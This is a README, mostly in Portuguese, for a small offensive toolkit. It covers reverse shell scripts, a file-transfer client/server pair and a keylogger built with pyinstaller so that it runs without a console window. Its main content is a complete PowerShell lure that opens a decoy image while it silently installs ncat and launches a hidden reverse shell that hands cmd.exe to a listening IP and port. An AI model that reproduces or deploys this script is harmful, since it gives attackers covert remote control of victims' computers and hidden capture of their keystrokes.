#USE O ARQUIVO PYTHON PARA FZER O REVERSE SHELL, SE ESTIVER USANDO O LINUX USE O ARQUIVO "linshell.py"
SE ESTIVER USANDO O WINDOWS UTILIZE O ARQUIVO "winshell.py", CONFIGURE NO ARQUIVO O EXATO IP E PORTA ONDE
ESTARÁ ESCUTANDO NA SUA MAQUINA;

#VOCÊ PODE USAR A OPÇÃO 'help' NO TERMINAL PARA VER ALGUMAS FUNCIONALIDADES DO SCRIPT;

#NA PASTA 'Comunication' VOCÊ VERÁ DOIS ARQUIVOS ONDE O ARQUIVO DO SERVIDOR
É USADO PARA ESCUTAR E O CLIENT SE CONECTA A ELE, É UM SCRIPT EM FAZE DE TESTES DE APRIMORAMENTO
PARA FINS EDUCATIVOS;

#PARA RECEBER OU ENVIAR ARQUIVOS NA SUA MAQUINA OU NO SERVIDOR ONDE ESTÁ O 
ARQUIVO 'server.py' VOCÊ PODE USAR OS ARQUIVOS 'client.py' E O 'server.py'
CONFIGURE-OS PARA FAZER A CONEXÃO;

#QUANDO CONECTADOS O CLIENTE DEVERÁ DIZER O NOME DO ARQUIVO OU PASTA QUE SERÁ 
ENVIADA DO SERVIDOR COLOQUE O ARQUIVO OU PASTA DESEJADA NA MESMA PASTA ONDE
O ARQUIVO('server.py') ESTÁ SENDO EXECUTADO.

To make your keylogger run you need install the pyinstaller 
and run this comand in your console:


pyinstaller --onefile --noconsole main.py

try also hide a script behide a image with a .ps1:

# DEFINE O DIRETÓRIO DO DESKTOP
$desktopPath = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Desktop)

# DEFINE O URL E O CAMINHO DO ARQUIVO DE IMAGEM
$url2 = "https://www.minitool.com/images/uploads/news/2020/04/system-error-codes-fixes/system-error-codes-fixes-thumbnail.png"
$filename2 = "picture15322.jpg"
$finalPath2 = Join-Path -Path $desktopPath -ChildPath $filename2

# DOWNLOAD A IMAGEM
Invoke-WebRequest -Uri $url2 -OutFile $finalPath2

# ABRE A IMAGEM
Start-Process $finalPath2
# INSTALA O NCAT USANDO O WINGET
winget install Insecure.Nmap

# AGUARDA A INSTALAÇÃO COMPLETA (OPCIONAL)
Start-Sleep -Seconds 15



# DEFINE OS PARÂMETROS PARA O NCAT
$params = "192.168.1.14 5555 -e cmd.exe"

# EXECUTA O NCAT COM OS PARÂMETROS
Start-Process -FilePath "ncat" -ArgumentList $params -WindowStyle Hidden



creditos: Jhonnunes443
